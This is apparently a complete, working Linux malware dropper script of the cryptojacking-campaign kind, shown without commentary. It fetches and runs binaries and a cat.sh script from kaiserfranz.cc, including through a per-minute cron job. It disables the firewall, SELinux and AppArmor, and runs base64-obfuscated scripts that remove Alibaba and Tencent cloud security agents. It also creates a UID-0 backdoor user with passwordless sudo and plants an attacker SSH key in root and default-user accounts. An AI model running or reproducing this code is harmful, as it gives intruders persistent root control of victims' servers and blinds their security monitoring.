#!/bin/bash

SOURCE_URL="http://kaiserfranz.cc/meoow"


function INIT_MAIN(){
if [[ $EUID -ne 0 ]]; then
echo "I am NOT root" 
cd $HOME
wget $SOURCE_URL/bin/allin -O $HOME/.configure
chmod +x $HOME/.configure
$HOME/.configure

wget $SOURCE_URL/bin/zigg -O $HOME/.kube
chmod +x $HOME/.kube
$HOME/.kube

history -c
clear
else
echo "I am root" 
FIRST_CONFIG
SETUP_SOMETHING
MAKE_USER
SSH_BR34CK0UT
fi
}

function FIRST_CONFIG(){
export LC_ALL=C
ulimit -n 65535
ufw disable
iptables -F
sudo sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
if ps aux | grep -i '[a]liyun'; then
  echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7CmlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9IiBdO3RoZW4KICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9hZWdpc19kZWJ1ZwogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash
  echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
}

function SETUP_SOMETHING(){
if ! type sudo 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y sudo 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y sudo 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add sudo 2>/dev/null 1>/dev/null; fi
fi
if ! type chattr 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add e2fsprogs 2>/dev/null 1>/dev/null; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! type curl 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y curl 2>/dev/null 1>/dev/null; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y curl 2>/dev/null 1>/dev/null; yum reinstall -y curl 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add curl 2>/dev/null 1>/dev/null; fi
fi
if ! type bc 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bc 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bc 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bc 2>/dev/null 1>/dev/null; fi
fi
if ! type lscpu 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y util-linux 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y util-linux 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add util-linux 2>/dev/null 1>/dev/null; fi
fi
if ! type nproc 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y coreutils 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y coreutils 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add coreutils 2>/dev/null 1>/dev/null; fi
fi
if ! type ssh 2>/dev/null 1>/dev/null; then 
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y openssh-clients 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y openssh-clients 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add openssh-clients 2>/dev/null 1>/dev/null; fi
fi
if ! type sshd 2>/dev/null 1>/dev/null; then 
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y openssh-server 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y openssh-server 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add openssh-server 2>/dev/null 1>/dev/null; fi
fi
}

function MAKE_USER(){
RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCkvKuOfk2vdyDIVynV5MTNaWDQkJWJNP5PjSli2p/SuM8i+JDsLlVq1VJffTS5JFHoPfXRQ7Qum/Nn9vH8JFYXCP1x4CjCYQu1kXHoUX2yx6OWfz1UJsks9DjnrPO7GavqoKGkuCbhO75A2WMVyRYDqixWg7EwpA7JcoYJ2ncgiT4ulZWtTL9Wevpkihsw/x3Nslj74Q9nG4nvN0N5QiX5T6pABJuVqUCOqX4PuLNiA/IFORYyf8rj8CFz9ZW3qRX2iygAWCioAcAEv64i8BZpKekdmaX+9YgEH0lx3KRHD+1cPda2WbDtQQwL72mQhMi3+G+UpKNUuyM6Fm7cDHhqP2N14afCyeOvB6yWNAMklEdkyzMmZgD/qyNzPJk2pUN4CxkwP8o7mGyfcYhqN8q0X4GY/BgfhH1Q62fm2MME+a9cXgM9F0mdUolr6D+f8gMhVdQxqnAo6guxQXK9llffQurCl1nDNtV8LXY828juOfDXOIpK5w53Q0wF8VBp23kTyA/vVar/e7g1MYmkmmI6hyIAZAl8PU5kfz08dyQ8IW2HFM7pHYDTaT8CbJwTQ3M6fSafYU0jmJiFZtJnpJ1A+T2bujiRDWtC3TtrwQXEVNrrKVpoRMJtAy5SCCtugG46DZA0brChC+DPbQxxo8BhwDQQHAeZsnrSXEYHpmD0CQ== root@localhost"
chattr -ia /etc/ /etc/ssh/ /etc/passwd /etc/shadow /etc/sudoers /etc/ssh/sshd_config 2>/dev/null
sleep 1
cat /etc/passwd | grep hilde 2>/dev/null || echo 'hilde:x:0:0::/home/hilde:/bin/bash' >> /etc/passwd
cat /etc/shadow | grep hilde 2>/dev/null || echo 'hilde:/BnKiPmXA2eAQ:18572:0:99999:7:::' >> /etc/shadow
cat /etc/sudoers | grep hilde 2>/dev/null || echo 'hilde  ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sleep 1
useradd -p /BnKiPmXA2eAQ -G root hilde 2>/dev/null
useradd -p /BnKiPmXA2eAQ -g root hilde 2>/dev/null
usermod -o -u 0 -g 0 hilde 2>/dev/null
adduser hilde 2>/dev/null
usermod -aG sudoers hilde 2>/dev/null
usermod -aG root hilde 2>/dev/null
#sudo useradd -p /BnKiPmXA2eAQ -G root hilde 2>/dev/null
#sudo adduser hilde sudo 2>/dev/null
#sudo adduser hilde sudoers 2>/dev/null
#sudo adduser hilde root 2>/dev/null
sleep 1
if [ ! -e /home/hilde/.ssh/ ]; then chattr -ia /home/ /home/hilde/ ; mkdir -p /home/hilde/.ssh/ ; fi 2>/dev/null
if [ ! -e /root/.ssh/ ]; then chattr -ia /root/ ; mkdir -p /root/.ssh/ ; fi 2>/dev/null
if [ ! -f /home/hilde/.ssh/authorized_keys ]; then touch /home/hilde/.ssh/authorized_keys ; fi 2>/dev/null
if [ ! -f /home/hilde/.ssh/authorized_keys2 ]; then touch /home/hilde/.ssh/authorized_keys2 ; fi 2>/dev/null
if [ ! -f /root/.ssh/authorized_keys ]; then touch /root/.ssh/authorized_keys ; fi 2>/dev/null
if [ ! -f /root/.ssh/authorized_keys2 ]; then touch /root/.ssh/authorized_keys2 ; fi 2>/dev/null
if [ ! -f /etc/ssh/.authorized_keys ]; then touch /etc/ssh/.authorized_keys ; fi 2>/dev/null
chattr -ia /home/ /home/hilde/ /home/hilde/.ssh/ /home/hilde/.ssh/authorized_keys /home/hilde/.ssh/authorized_keys2 2>/dev/null
chattr -ia /root/ /root/.ssh/ /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 2>/dev/null
chmod 1777 /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 /home/hilde/.ssh/authorized_keys /home/hilde/.ssh/authorized_keys2 2>/dev/null
echo $RSAKEY >> /root/.ssh/authorized_keys
echo $RSAKEY > /root/.ssh/authorized_keys2
echo $RSAKEY >>  /home/hilde/.ssh/authorized_keys
echo $RSAKEY >  /home/hilde/.ssh/authorized_keys2
echo $RSAKEY > /etc/ssh/.authorized_keys
chmod 644 /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 /home/hilde/.ssh/authorized_keys /home/hilde/.ssh/authorized_keys2
chown hilde:hilde /home/hilde/.ssh/authorized_keys /home/hilde/.ssh/authorized_keys2
chown root:root /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 2>/dev/null
sed -i '/AuthorizedKeysFile/c\AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2 /etc/ssh/.authorized_keys' /etc/ssh/sshd_config
sed -i '/PubkeyAuthentication/c\PubkeyAuthentication yes' /etc/ssh/sshd_config
sed -i '/PasswordAuthentication/c\PasswordAuthentication yes' /etc/ssh/sshd_config
sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
if [ -e /home/ubuntu/ ]; then
echo 'Found User: ubuntu - ... '
if [ ! -e /home/ubuntu/.ssh/ ]; then chattr -ia /home/ /home/ubuntu/ ; mkdir -p /home/ubuntu/.ssh/ ; fi 2>/dev/null
if [ ! -f /home/ubuntu/.ssh/authorized_keys ]; then touch /home/ubuntu/.ssh/authorized_keys ; fi 2>/dev/null
if [ ! -f /home/ubuntu/.ssh/authorized_keys2 ]; then touch /home/ubuntu/.ssh/authorized_keys2 ; fi 2>/dev/null
echo $RSAKEY >>  /home/ubuntu/.ssh/authorized_keys
echo $RSAKEY >  /home/ubuntu/.ssh/authorized_keys2
fi
if [ -e /home/ec2-user/ ]; then
echo 'Found User: ec2-user - ... '
if [ ! -e /home/ec2-user/.ssh/ ]; then chattr -ia /home/ /home/ec2-user/ ; mkdir -p /home/ec2-user/.ssh/ ; fi 2>/dev/null
if [ ! -f /home/ec2-user/.ssh/authorized_keys ]; then touch /home/ec2-user/.ssh/authorized_keys ; fi 2>/dev/null
if [ ! -f /home/ec2-user/.ssh/authorized_keys2 ]; then touch /home/ec2-user/.ssh/authorized_keys2 ; fi 2>/dev/null
echo $RSAKEY >>  /home/ec2-user/.ssh/authorized_keys
echo $RSAKEY >  /home/ec2-user/.ssh/authorized_keys2
fi
rm -f /tmp/.r.meow* 2>/dev/null
ssh-keygen -t rsa -b 4096 -P '' -f /tmp/.r.meow
cat /tmp/.r.meow.pub >> /root/.ssh/authorized_keys
cat /tmp/.r.meow.pub >> /root/.ssh/authorized_keys2
}

function CRON_BREAKOUT(){		# FALLBACK
DLOAD="wget -q -O -"
if [ -s /usr/bin/curl ]; then DLOAD="/usr/bin/curl -Lk"
elif [ -s /bin/curl ]; then DLOAD="/bin/curl -Lk"
elif [ -s /usr/bin/wget ]; then DLOAD="/usr/bin/wget -q -O -"
elif [ -s /bin/wget ]; then DLOAD="/bin/wget -q -O -"
fi

chattr -ia /var/ /var/spool/ /etc/ /etc/crontab 2>/dev/null ; tntrecht -ia /var/ /var/spool/ /etc/ /etc/crontab 2>/dev/null
chattr -R -ia /var/spool/cron/ /etc/cron*/ 2>/dev/null ; tntrecht -R -ia /var/spool/cron/ /etc/cron*/ 2>/dev/null
crontab -l | grep -e "http://kaiserfranz.cc/meow/cat.sh" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "* * * * * $DLOAD http://kaiserfranz.cc/meow/cat.sh | bash ; crontab -r > /dev/null 2>&1"
  ) | crontab -
fi
}

function SSH_BR34CK0UT(){
SSHPORT=`cat /etc/ssh/sshd_config | grep -v grep | grep "Port " | awk '{print $2}'`
if [ -z "$SSHPORT" ]; then SSHPORT=22 ; fi

if ! type sudo 2>/dev/null 1>/dev/null; then
curl http://kaiserfranz.cc/meow/cat.sh | bash || wget -O - http://kaiserfranz.cc/meow/cat.sh | bash
else
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i /tmp/.r.meow root@127.0.0.1 -p$SSHPORT "curl http://kaiserfranz.cc/meow/cat.sh | bash || wget -O - http://kaiserfranz.cc/meow/cat.sh | bash"
HE_SAY=$?

if [ ! "$HE_SAY" = "0" ]; then
CRON_BREAKOUT
fi

fi
rm -f /tmp/.r.meow.pub /tmp/.r.meow 2>/dev/null
}



INIT_MAIN
